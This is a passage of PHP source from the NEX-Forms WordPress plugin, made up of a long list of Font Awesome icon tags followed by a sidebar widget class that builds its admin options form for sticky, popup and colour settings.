<i class="fa fa-cube"></i>
<i class="fa fa-cubes"></i>
<i class="fa fa-cutlery"></i>
<i class="fa fa-dashboard"></i>
<i class="fa fa-database"></i>
<i class="fa fa-desktop"></i>
<i class="fa fa-dot-circle-o"></i>
<i class="fa fa-download"></i>
<i class="fa fa-edit"></i> 
<i class="fa fa-ellipsis-h"></i>
<i class="fa fa-ellipsis-v"></i>
<i class="fa fa-envelope"></i>
<i class="fa fa-envelope-o"></i>
<i class="fa fa-envelope-square"></i>
<i class="fa fa-eraser"></i>
<i class="fa fa-exchange"></i>
<i class="fa fa-exclamation"></i>
<i class="fa fa-exclamation-circle"></i>
<i class="fa fa-exclamation-triangle"></i>
<i class="fa fa-external-link"></i>
<i class="fa fa-external-link-square"></i>
<i class="fa fa-eye"></i>
<i class="fa fa-eye-slash"></i>
<i class="fa fa-eyedropper"></i>
<i class="fa fa-fax"></i>
<i class="fa fa-female"></i>
<i class="fa fa-fighter-jet"></i>
<i class="fa fa-file-archive-o"></i>
<i class="fa fa-file-audio-o"></i>
<i class="fa fa-file-code-o"></i>
<i class="fa fa-file-excel-o"></i>
<i class="fa fa-file-image-o"></i>
<i class="fa fa-file-movie-o"></i>
<i class="fa fa-file-pdf-o"></i>
<i class="fa fa-file-photo-o"></i>
<i class="fa fa-file-picture-o"></i> 
<i class="fa fa-file-powerpoint-o"></i>
<i class="fa fa-file-sound-o"></i> 
<i class="fa fa-file-video-o"></i>
<i class="fa fa-file-word-o"></i>
<i class="fa fa-file-zip-o"></i> 
<i class="fa fa-film"></i>
<i class="fa fa-filter"></i>
<i class="fa fa-fire"></i>
<i class="fa fa-fire-extinguisher"></i>
<i class="fa fa-flag"></i>
<i class="fa fa-flag-checkered"></i>
<i class="fa fa-flag-o"></i>
<i class="fa fa-flash"></i> 
<i class="fa fa-flask"></i>
<i class="fa fa-folder"></i>
<i class="fa fa-folder-o"></i>
<i class="fa fa-folder-open"></i>
<i class="fa fa-folder-open-o"></i>
<i class="fa fa-frown-o"></i>
<i class="fa fa-futbol-o"></i>
<i class="fa fa-gamepad"></i>
<i class="fa fa-gavel"></i>
<i class="fa fa-gear"></i> 
<i class="fa fa-gears"></i> 
<i class="fa fa-gift"></i>
<i class="fa fa-glass"></i>
<i class="fa fa-globe"></i>
<i class="fa fa-graduation-cap"></i>
<i class="fa fa-group"></i> 
<i class="fa fa-hdd-o"></i>
<i class="fa fa-headphones"></i>
<i class="fa fa-heart"></i>
<i class="fa fa-heart-o"></i>
<i class="fa fa-history"></i>
<i class="fa fa-home"></i>
<i class="fa fa-image"></i>
<i class="fa fa-inbox"></i>
<i class="fa fa-info"></i>
<i class="fa fa-info-circle"></i>
<i class="fa fa-institution"></i>
<i class="fa fa-key"></i>
<i class="fa fa-keyboard-o"></i>
<i class="fa fa-language"></i>
<i class="fa fa-laptop"></i>
<i class="fa fa-leaf"></i>
<i class="fa fa-legal"></i> 
<i class="fa fa-lemon-o"></i>
<i class="fa fa-level-down"></i>
<i class="fa fa-level-up"></i>
<i class="fa fa-life-bouy"></i> 
<i class="fa fa-life-buoy"></i> 
<i class="fa fa-life-ring"></i>
<i class="fa fa-life-saver"></i> 
<i class="fa fa-lightbulb-o"></i>
<i class="fa fa-line-chart"></i>
<i class="fa fa-location-arrow"></i>
<i class="fa fa-lock"></i>
<i class="fa fa-magic"></i>
<i class="fa fa-magnet"></i>
<i class="fa fa-mail-forward"></i>
<i class="fa fa-mail-reply"></i>
<i class="fa fa-mail-reply-all"></i>
<i class="fa fa-male"></i>
<i class="fa fa-map-marker"></i>
<i class="fa fa-meh-o"></i>
<i class="fa fa-microphone"></i>
<i class="fa fa-microphone-slash"></i>
<i class="fa fa-minus"></i>
<i class="fa fa-minus-circle"></i>
<i class="fa fa-minus-square"></i>
<i class="fa fa-minus-square-o"></i>
<i class="fa fa-mobile"></i>
<i class="fa fa-mobile-phone"></i>
<i class="fa fa-money"></i>
<i class="fa fa-moon-o"></i>
<i class="fa fa-mortar-board"></i> 
<i class="fa fa-music"></i>
<i class="fa fa-navicon"></i>
<i class="fa fa-newspaper-o"></i>
<i class="fa fa-paint-brush"></i>
<i class="fa fa-paper-plane"></i>
<i class="fa fa-paper-plane-o"></i>
<i class="fa fa-paw"></i>
<i class="fa fa-pencil"></i>
<i class="fa fa-pencil-square"></i>
<i class="fa fa-pencil-square-o"></i>
<i class="fa fa-phone"></i>
<i class="fa fa-phone-square"></i>
<i class="fa fa-photo"></i>
<i class="fa fa-picture-o"></i>
<i class="fa fa-pie-chart"></i>
<i class="fa fa-plane"></i>
<i class="fa fa-plug"></i>
<i class="fa fa-plus"></i>
<i class="fa fa-plus-circle"></i>
<i class="fa fa-plus-square"></i>
<i class="fa fa-plus-square-o"></i>
<i class="fa fa-power-off"></i>
<i class="fa fa-print"></i>
<i class="fa fa-puzzle-piece"></i>
<i class="fa fa-qrcode"></i>
<i class="fa fa-question"></i>
<i class="fa fa-question-circle"></i>
<i class="fa fa-quote-left"></i>
<i class="fa fa-quote-right"></i>
<i class="fa fa-random"></i>
<i class="fa fa-recycle"></i>
<i class="fa fa-refresh"></i>
<i class="fa fa-remove"></i>
<i class="fa fa-reorder"></i>
<i class="fa fa-reply"></i>
<i class="fa fa-reply-all"></i>
<i class="fa fa-retweet"></i>
<i class="fa fa-road"></i>
<i class="fa fa-rocket"></i>
<i class="fa fa-rss"></i>
<i class="fa fa-rss-square"></i>
<i class="fa fa-search"></i>
<i class="fa fa-search-minus"></i>
<i class="fa fa-search-plus"></i>
<i class="fa fa-send"></i>
<i class="fa fa-send-o"></i>
<i class="fa fa-share"></i>
<i class="fa fa-share-alt"></i>
<i class="fa fa-share-alt-square"></i>
<i class="fa fa-share-square"></i>
<i class="fa fa-share-square-o"></i>
<i class="fa fa-shield"></i>
<i class="fa fa-shopping-cart"></i>
<i class="fa fa-sign-in"></i>
<i class="fa fa-sign-out"></i>
<i class="fa fa-signal"></i>
<i class="fa fa-sitemap"></i>
<i class="fa fa-sliders"></i>
<i class="fa fa-smile-o"></i>
<i class="fa fa-soccer-ball-o"></i>
<i class="fa fa-sort"></i>
<i class="fa fa-sort-alpha-asc"></i>
<i class="fa fa-sort-alpha-desc"></i>
<i class="fa fa-sort-amount-asc"></i>
<i class="fa fa-sort-amount-desc"></i>
<i class="fa fa-sort-asc"></i>
<i class="fa fa-sort-desc"></i>
<i class="fa fa-sort-down"></i>
<i class="fa fa-sort-numeric-asc"></i>
<i class="fa fa-sort-numeric-desc"></i>
<i class="fa fa-sort-up"></i>
<i class="fa fa-space-shuttle"></i>
<i class="fa fa-spinner"></i>
<i class="fa fa-spoon"></i>
<i class="fa fa-square"></i>
<i class="fa fa-square-o"></i>
<i class="fa fa-star"></i>
<i class="fa fa-star-half"></i>
<i class="fa fa-star-half-empty"></i>
<i class="fa fa-star-half-full"></i>
<i class="fa fa-star-half-o"></i>
<i class="fa fa-star-o"></i>
<i class="fa fa-suitcase"></i>
<i class="fa fa-sun-o"></i>
<i class="fa fa-support"></i>
<i class="fa fa-tablet"></i>
<i class="fa fa-tachometer"></i>
<i class="fa fa-tag"></i>
<i class="fa fa-tags"></i>
<i class="fa fa-tasks"></i>
<i class="fa fa-taxi"></i>
<i class="fa fa-terminal"></i>
<i class="fa fa-thumb-tack"></i>
<i class="fa fa-thumbs-down"></i>
<i class="fa fa-thumbs-o-down"></i>
<i class="fa fa-thumbs-o-up"></i>
<i class="fa fa-thumbs-up"></i>
<i class="fa fa-ticket"></i>
<i class="fa fa-times"></i>
<i class="fa fa-times-circle"></i>
<i class="fa fa-times-circle-o"></i>
<i class="fa fa-tint"></i>
<i class="fa fa-toggle-down"></i>
<i class="fa fa-toggle-left"></i>
<i class="fa fa-toggle-off"></i>
<i class="fa fa-toggle-on"></i>
<i class="fa fa-toggle-right"></i>
<i class="fa fa-toggle-up"></i>
<i class="fa fa-trash"></i>
<i class="fa fa-trash-o"></i>
<i class="fa fa-tree"></i>
<i class="fa fa-trophy"></i>
<i class="fa fa-truck"></i>
<i class="fa fa-tty"></i>
<i class="fa fa-umbrella"></i>
<i class="fa fa-university"></i>
<i class="fa fa-unlock"></i>
<i class="fa fa-unlock-alt"></i>
<i class="fa fa-unsorted"></i>
<i class="fa fa-upload"></i>
<i class="fa fa-user"></i>
<i class="fa fa-users"></i>
<i class="fa fa-video-camera"></i>
<i class="fa fa-volume-down"></i>
<i class="fa fa-volume-off"></i>
<i class="fa fa-volume-up"></i>
<i class="fa fa-warning"></i>
<i class="fa fa-wheelchair"></i>
<i class="fa fa-wifi"></i>
<i class="fa fa-wrench"></i>
<i class="fa fa-file"></i>
<i class="fa fa-file-archive-o"></i>
<i class="fa fa-file-audio-o"></i>
<i class="fa fa-file-code-o"></i>
<i class="fa fa-file-excel-o"></i>
<i class="fa fa-file-image-o"></i>
<i class="fa fa-file-movie-o"></i>
<i class="fa fa-file-o"></i>
<i class="fa fa-file-pdf-o"></i>
<i class="fa fa-file-photo-o"></i>
<i class="fa fa-file-picture-o"></i>
<i class="fa fa-file-powerpoint-o"></i>
<i class="fa fa-file-sound-o"></i>
<i class="fa fa-file-text"></i>
<i class="fa fa-file-text-o"></i>
<i class="fa fa-file-video-o"></i>
<i class="fa fa-file-word-o"></i>
<i class="fa fa-file-zip-o"></i>
<i class="fa fa-circle-o-notch"></i>
<i class="fa fa-cog"></i>
<i class="fa fa-gear"></i>
<i class="fa fa-refresh"></i>
<i class="fa fa-spinner"></i>
<i class="fa fa-check-square"></i>
<i class="fa fa-check-square-o"></i>
<i class="fa fa-circle"></i>
<i class="fa fa-circle-o"></i>
<i class="fa fa-dot-circle-o"></i>
<i class="fa fa-minus-square"></i>
<i class="fa fa-minus-square-o"></i>
<i class="fa fa-plus-square"></i>
<i class="fa fa-plus-square-o"></i>
<i class="fa fa-square"></i>
<i class="fa fa-square-o"></i>
<i class="fa fa-cc-amex"></i>
<i class="fa fa-cc-discover"></i>
<i class="fa fa-cc-mastercard"></i>
<i class="fa fa-cc-paypal"></i>
<i class="fa fa-cc-stripe"></i>
<i class="fa fa-cc-visa"></i>
<i class="fa fa-credit-card"></i>
<i class="fa fa-google-wallet"></i>
<i class="fa fa-paypal"></i>
   <i class="fa fa-area-chart"></i>
<i class="fa fa-bar-chart"></i>
<i class="fa fa-bar-chart-o"></i>
<i class="fa fa-line-chart"></i>
<i class="fa fa-pie-chart"></i>
<i class="fa fa-bitcoin"></i>
<i class="fa fa-btc"></i>
<i class="fa fa-cny"></i>
<i class="fa fa-dollar"></i>
<i class="fa fa-eur"></i>
<i class="fa fa-euro"></i>
<i class="fa fa-gbp"></i>
<i class="fa fa-ils"></i>
<i class="fa fa-inr"></i>
<i class="fa fa-jpy"></i>
<i class="fa fa-krw"></i>
<i class="fa fa-money"></i>
<i class="fa fa-rmb"></i>
<i class="fa fa-rouble"></i>
<i class="fa fa-rub"></i>
<i class="fa fa-ruble"></i>
<i class="fa fa-rupee"></i>
<i class="fa fa-shekel"></i>
<i class="fa fa-sheqel"></i>
<i class="fa fa-try"></i>
<i class="fa fa-turkish-lira"></i>
<i class="fa fa-usd"></i>
<i class="fa fa-won"></i>
<i class="fa fa-yen"></i>
<i class="fa fa-align-center"></i>
<i class="fa fa-align-justify"></i>
<i class="fa fa-align-left"></i>
<i class="fa fa-align-right"></i>
<i class="fa fa-bold"></i>
<i class="fa fa-chain"></i>
<i class="fa fa-chain-broken"></i>
<i class="fa fa-clipboard"></i>
<i class="fa fa-columns"></i>
<i class="fa fa-copy"></i>
<i class="fa fa-cut"></i>
<i class="fa fa-dedent"></i>
<i class="fa fa-eraser"></i>
<i class="fa fa-file"></i>
<i class="fa fa-file-o"></i>
<i class="fa fa-file-text"></i>
<i class="fa fa-file-text-o"></i>
<i class="fa fa-files-o"></i>
<i class="fa fa-floppy-o"></i>
<i class="fa fa-font"></i>
<i class="fa fa-header"></i>
<i class="fa fa-indent"></i>
<i class="fa fa-italic"></i>
<i class="fa fa-link"></i>
<i class="fa fa-list"></i>
<i class="fa fa-list-alt"></i>
<i class="fa fa-list-ol"></i>
<i class="fa fa-list-ul"></i>
<i class="fa fa-outdent"></i>
<i class="fa fa-paperclip"></i>
<i class="fa fa-paragraph"></i>
<i class="fa fa-paste"></i>
<i class="fa fa-repeat"></i>
<i class="fa fa-rotate-left"></i>
<i class="fa fa-rotate-right"></i>
<i class="fa fa-save"></i>
<i class="fa fa-scissors"></i>
<i class="fa fa-strikethrough"></i>
<i class="fa fa-subscript"></i>
<i class="fa fa-superscript"></i>
<i class="fa fa-table"></i>
<i class="fa fa-text-height"></i>
<i class="fa fa-text-width"></i>
<i class="fa fa-th"></i>
<i class="fa fa-th-large"></i>
<i class="fa fa-th-list"></i>
<i class="fa fa-underline"></i>
<i class="fa fa-undo"></i>
<i class="fa fa-unlink"></i>
<i class="fa fa-angle-double-down"></i>
<i class="fa fa-angle-double-left"></i>
<i class="fa fa-angle-double-right"></i>
<i class="fa fa-angle-double-up"></i>
<i class="fa fa-angle-down"></i>
<i class="fa fa-angle-left"></i>
<i class="fa fa-angle-right"></i>
<i class="fa fa-angle-up"></i>
<i class="fa fa-arrow-circle-down"></i>
<i class="fa fa-arrow-circle-left"></i>
<i class="fa fa-arrow-circle-o-down"></i>
<i class="fa fa-arrow-circle-o-left"></i>
<i class="fa fa-arrow-circle-o-right"></i>
<i class="fa fa-arrow-circle-o-up"></i>
<i class="fa fa-arrow-circle-right"></i>
<i class="fa fa-arrow-circle-up"></i>
<i class="fa fa-arrow-down"></i>
<i class="fa fa-arrow-left"></i>
<i class="fa fa-arrow-right"></i>
<i class="fa fa-arrow-up"></i>
<i class="fa fa-arrows"></i>
<i class="fa fa-arrows-alt"></i>
<i class="fa fa-arrows-h"></i>
<i class="fa fa-arrows-v"></i>
<i class="fa fa-caret-down"></i>
<i class="fa fa-caret-left"></i>
<i class="fa fa-caret-right"></i>
<i class="fa fa-caret-square-o-down"></i>
<i class="fa fa-caret-square-o-left"></i>
<i class="fa fa-caret-square-o-right"></i>
<i class="fa fa-caret-square-o-up"></i>
<i class="fa fa-caret-up"></i>
<i class="fa fa-chevron-circle-down"></i>
<i class="fa fa-chevron-circle-left"></i>
<i class="fa fa-chevron-circle-right"></i>
<i class="fa fa-chevron-circle-up"></i>
<i class="fa fa-chevron-down"></i>
<i class="fa fa-chevron-left"></i>
<i class="fa fa-chevron-right"></i>
<i class="fa fa-chevron-up"></i>
<i class="fa fa-hand-o-down"></i>
<i class="fa fa-hand-o-left"></i>
<i class="fa fa-hand-o-right"></i>
<i class="fa fa-hand-o-up"></i>
<i class="fa fa-long-arrow-down"></i>
<i class="fa fa-long-arrow-left"></i>
<i class="fa fa-long-arrow-right"></i>
<i class="fa fa-long-arrow-up"></i>
<i class="fa fa-toggle-down"></i>
<i class="fa fa-toggle-left"></i>
<i class="fa fa-toggle-right"></i>
<i class="fa fa-toggle-up"></i>
   <i class="fa fa-arrows-alt"></i>
<i class="fa fa-backward"></i>
<i class="fa fa-compress"></i>
<i class="fa fa-eject"></i>
<i class="fa fa-expand"></i>
<i class="fa fa-fast-backward"></i>
<i class="fa fa-fast-forward"></i>
<i class="fa fa-forward"></i>
<i class="fa fa-pause"></i>
<i class="fa fa-play"></i>
<i class="fa fa-play-circle"></i>
<i class="fa fa-play-circle-o"></i>
<i class="fa fa-step-backward"></i>
<i class="fa fa-step-forward"></i>
<i class="fa fa-stop"></i>
<i class="fa fa-youtube-play"></i>
<i class="fa fa-adn"></i>
<i class="fa fa-android"></i>
<i class="fa fa-angellist"></i>
<i class="fa fa-apple"></i>
<i class="fa fa-behance"></i>
<i class="fa fa-behance-square"></i>
<i class="fa fa-bitbucket"></i>
<i class="fa fa-bitbucket-square"></i>
<i class="fa fa-bitcoin"></i>
<i class="fa fa-btc"></i>
<i class="fa fa-cc-amex"></i>
<i class="fa fa-cc-discover"></i>
<i class="fa fa-cc-mastercard"></i>
<i class="fa fa-cc-paypal"></i>
<i class="fa fa-cc-stripe"></i>
<i class="fa fa-cc-visa"></i>
<i class="fa fa-codepen"></i>
<i class="fa fa-css3"></i>
<i class="fa fa-delicious"></i>
<i class="fa fa-deviantart"></i>
<i class="fa fa-digg"></i>
<i class="fa fa-dribbble"></i>
<i class="fa fa-dropbox"></i>
<i class="fa fa-drupal"></i>
<i class="fa fa-empire"></i>
<i class="fa fa-facebook"></i>
<i class="fa fa-facebook-square"></i>
<i class="fa fa-flickr"></i>
<i class="fa fa-foursquare"></i>
<i class="fa fa-ge"></i>
<i class="fa fa-git"></i>
<i class="fa fa-git-square"></i>
<i class="fa fa-github"></i>
<i class="fa fa-github-alt"></i>
<i class="fa fa-github-square"></i>
<i class="fa fa-gittip"></i>
<i class="fa fa-google"></i>
<i class="fa fa-google-plus"></i>
<i class="fa fa-google-plus-square"></i>
<i class="fa fa-google-wallet"></i>
<i class="fa fa-hacker-news"></i>
<i class="fa fa-html5"></i>
<i class="fa fa-instagram"></i>
<i class="fa fa-ioxhost"></i>
<i class="fa fa-joomla"></i>
<i class="fa fa-jsfiddle"></i>
<i class="fa fa-lastfm"></i>
<i class="fa fa-lastfm-square"></i>
<i class="fa fa-linkedin"></i>
<i class="fa fa-linkedin-square"></i>
<i class="fa fa-linux"></i>
<i class="fa fa-maxcdn"></i>
<i class="fa fa-meanpath"></i>
<i class="fa fa-openid"></i>
<i class="fa fa-pagelines"></i>
<i class="fa fa-paypal"></i>
<i class="fa fa-pied-piper"></i>
<i class="fa fa-pied-piper-alt"></i>
<i class="fa fa-pinterest"></i>
<i class="fa fa-pinterest-square"></i>
<i class="fa fa-qq"></i>
<i class="fa fa-ra"></i>
<i class="fa fa-rebel"></i>
<i class="fa fa-reddit"></i>
<i class="fa fa-reddit-square"></i>
<i class="fa fa-renren"></i>
<i class="fa fa-share-alt"></i>
<i class="fa fa-share-alt-square"></i>
<i class="fa fa-skype"></i>
<i class="fa fa-slack"></i>
<i class="fa fa-slideshare"></i>
<i class="fa fa-soundcloud"></i>
<i class="fa fa-spotify"></i>
<i class="fa fa-stack-exchange"></i>
<i class="fa fa-stack-overflow"></i>
<i class="fa fa-steam"></i>
<i class="fa fa-steam-square"></i>
<i class="fa fa-stumbleupon"></i>
<i class="fa fa-stumbleupon-circle"></i>
<i class="fa fa-tencent-weibo"></i>
<i class="fa fa-trello"></i>
<i class="fa fa-tumblr"></i>
<i class="fa fa-tumblr-square"></i>
<i class="fa fa-twitch"></i>
<i class="fa fa-twitter"></i>
<i class="fa fa-twitter-square"></i>
<i class="fa fa-vimeo-square"></i>
<i class="fa fa-vine"></i>
<i class="fa fa-vk"></i>
<i class="fa fa-wechat"></i>
<i class="fa fa-weibo"></i>
<i class="fa fa-weixin"></i>
<i class="fa fa-windows"></i>
<i class="fa fa-wordpress"></i>
<i class="fa fa-xing"></i>
<i class="fa fa-xing-square"></i>
<i class="fa fa-yahoo"></i>
<i class="fa fa-yelp"></i>
<i class="fa fa-youtube"></i>
<i class="fa fa-youtube-play"></i>
<i class="fa fa-youtube-square"></i>
<i class="fa fa-ambulance"></i>
<i class="fa fa-h-square"></i>
<i class="fa fa-hospital-o"></i>
<i class="fa fa-medkit"></i>
<i class="fa fa-plus-square"></i>
<i class="fa fa-stethoscope"></i>
<i class="fa fa-user-md"></i>
<i class="fa fa-wheelchair"></i>';



return $output;
		}

}

class NEXForms_widget extends WP_Widget{
	public $name = 'NEX-Forms';
	public $widget_desc = 'Add NEX-Forms to your sidebars.';
	
	public $control_options = array('title' => '','form_id' => '', 'make_sticky'=>'no', 'paddel_text'=>'Contact Us', 'paddel_color'=>'btn-primary', 'position'=>'right', 'open_trigger'=>'normal','type'=>'button' , 'text'=>'Open Form', 'button_color'=>'btn-primary');
	function __construct(){
		$widget_options = array('classname' => __CLASS__,'description' => $this->widget_desc);
		parent::__construct( __CLASS__, $this->name,$widget_options , $this->control_options);
	}
	function widget($args, $instance){
		echo '<div class="widget">';
		NEXForms_ui_output(
			array(
				'id'=>$instance['form_id'],
				'make_sticky'=>$instance['make_sticky'],
				'paddel_text'=>$instance['paddel_text'],
				'paddel_color'=>$instance['paddel_color'],
				'position'=>$instance['position'],
				'open_trigger'=>$instance['open_trigger'],
				'type'=>$instance['type'],
				'text'=>$instance['text'],
				'button_color'=>$instance['button_color']
				
				),true);
		echo '</div>';
	}
	public function form( $instance ){
		$placeholders = array();
		foreach ( $this->control_options as $key => $val )
			{
			$placeholders[ $key .'.id' ] = $this->get_field_id( $key);
			$placeholders[ $key .'.name' ] = $this->get_field_name($key );
			if ( isset($instance[ $key ] ) )
				$placeholders[ $key .'.value' ] = esc_attr( $instance[$key] );
			else
				$placeholders[ $key .'.value' ] = $this->control_options[ $key ];
			}
		global $wpdb;
		$do_get_forms = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms ORDER BY Id DESC');
		$get_forms = $wpdb->get_results($do_get_forms);
		$current_form = NEXForms_widget_controls::parse('[+form_id.value+]', $placeholders);
		
		$tpl  = '<input id="[+title.id+]" name="[+title.name+]" value="'.IZC_Database::get_title(NEXForms_widget_controls::parse('[+form_id.value+]', $placeholders),'wap_nex_forms').'" class="widefat" style="width:96%;display:none;" />';
		
		if($get_forms)
			{
			$tpl  .= '<h3>Select Form</h3>';
			$tpl .= '<select id="[+form_id.id+]" name="[+form_id.name+] " style="width:100%;">';
				$tpl .= '<option value="0">-- Select form --</option>';
				foreach($get_forms as $form)
					$tpl .= '<option value="'.$form->Id.'" '.(($form->Id==$current_form) ? 'selected="selected"' : '' ).'>'.$form->title.'</option>';
			$tpl .= '</select></p>';
			}
		else
			$tpl .=  '<p>No forms have been created yet.<br /><br /><a href="'.get_option('siteurl').'/wp-admin/admin.php?page=WA-x_forms-main">Click here</a> or click on "X Forms" on the left-hand menu where you will be able to create a form that would be avialable here to select as a widget.</p>';
		
		
		$tpl  .= '<hr />';
		$tpl  .= '<h3>Sticky Mode Options</h3>';
		$tpl  .= '<p><label for="[+make_sticky.id+]"><strong>Make Sticky?</strong></label><br /><small><em>Choose <strong>no</strong> to display in sidebar.<br /> Choose <strong>yes</strong> to display form in sticky mode and select prefered settings.</em></small><br /><input id="1[+make_sticky.id+]" name="[+make_sticky.name+]" value="no" '.((NEXForms_widget_controls::parse('[+make_sticky.value+]', $placeholders))=='no' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="1[+make_sticky.id+]">No</label><br /><input id="2[+make_sticky.id+]" name="[+make_sticky.name+]" value="yes" '.((NEXForms_widget_controls::parse('[+make_sticky.value+]', $placeholders))=='yes' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="2[+make_sticky.id+]">Yes</label></p>';
		
		$tpl  .= '<p><label for="[+paddel_text.id+]"><strong>Paddel Text </strong></label><input type="text" id="[+paddel_text.id+]" name="[+paddel_text.name+]" value="'.NEXForms_widget_controls::parse('[+paddel_text.value+]', $placeholders).'" class="widefat" /><p>';
		
		$tpl  .= '<p><label for="[+paddel_color.id+]"><strong>Paddel Color</strong></label><br />';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #428bca; border-radius:4px; border:1px solid #357ebd; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-primary' ? 'checked="checked"' : '').' value="btn-primary"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #5bc0de; border-radius:4px; border:1px solid #46b8da; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-info' ? 'checked="checked"' : '').' value="btn-info"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #5cb85c; border-radius:4px; border:1px solid #4cae4c; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-success' ? 'checked="checked"' : '').' value="btn-success"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #f0ad4e; border-radius:4px; border:1px solid #eea236; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-warning' ? 'checked="checked"' : '').' value="btn-warning"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #d9534f; border-radius:4px; border:1px solid #d43f3a; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-danger' ? 'checked="checked"' : '').' value="btn-danger"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #ffffff; border-radius:4px; border:1px solid #cccccc; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+paddel_color.id+]" name="[+paddel_color.name+]" '.((NEXForms_widget_controls::parse('[+paddel_color.value+]', $placeholders))=='btn-default' ? 'checked="checked"' : '').' value="btn-default"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp</p>';

		$tpl  .= '<p><label for="[+position.id+]"><strong>Position</strong></label><br />';
		$tpl  .= '<input id="1[+position.id+]" name="[+position.name+]" '.((NEXForms_widget_controls::parse('[+position.value+]', $placeholders))=='top' ? 'checked="checked"' : '').' value="top"  type="radio" class="widefat"  /> <label for="1[+position.id+]">Top</label><br />';
		$tpl  .= '<input id="2[+position.id+]" name="[+position.name+]" '.((NEXForms_widget_controls::parse('[+position.value+]', $placeholders))=='right' ? 'checked="checked"' : '').' value="right"  type="radio" class="widefat"  /> <label for="2[+position.id+]">Right</label><br />';
		$tpl  .= '<input id="3[+position.id+]" name="[+position.name+]" '.((NEXForms_widget_controls::parse('[+position.value+]', $placeholders))=='bottom' ? 'checked="checked"' : '').' value="bottom"  type="radio" class="widefat"  /> <label for="3[+position.id+]">Bottom</label><br />';
		$tpl  .= '<input id="4[+position.id+]" name="[+position.name+]" '.((NEXForms_widget_controls::parse('[+position.value+]', $placeholders))=='left' ? 'checked="checked"' : '').' value="left"  type="radio" class="widefat"  /> <label for="4[+position.id+]">Left</label></p>';
		
		
		
		$tpl  .= '<hr />';
		$tpl  .= '<h3>Popup Form Options</h3>';
		$tpl  .= '<p><label for="[+open_trigger.id+]"><strong>Popup Form?</strong></label><br /><input id="1[+open_trigger.id+]" name="[+open_trigger.name+]" value="normal" '.((NEXForms_widget_controls::parse('[+open_trigger.value+]', $placeholders))=='normal' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="1[+open_trigger.id+]">No</label><br /><input id="2[+open_trigger.id+]" name="[+open_trigger.name+]" value="popup" '.((NEXForms_widget_controls::parse('[+open_trigger.value+]', $placeholders))=='popup' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="2[+open_trigger.id+]">Yes</label></p>';
		
		$tpl  .= '<p><label for="[+type.id+]"><strong>Popover Trigge</strong>r</label><br /><input id="1[+type.id+]" name="[+type.name+]" value="button" '.((NEXForms_widget_controls::parse('[+type.value+]', $placeholders))=='button' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="1[+type.id+]">Button</label><br /><input id="2[+type.id+]" name="[+type.name+]" value="link" '.((NEXForms_widget_controls::parse('[+type.value+]', $placeholders))=='link' ? 'checked="checked"' : '').' type="radio" class="widefat"  /> <label for="2[+type.id+]">Link</label></p>';
		
		$tpl  .= '<p><label for="[+button_color.id+]">Button Color</label><br />';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #428bca; border-radius:4px; border:1px solid #357ebd; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-primary' ? 'checked="checked"' : '').' value="btn-primary"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #5bc0de; border-radius:4px; border:1px solid #46b8da; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-info' ? 'checked="checked"' : '').' value="btn-info"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #5cb85c; border-radius:4px; border:1px solid #4cae4c; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-success' ? 'checked="checked"' : '').' value="btn-success"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
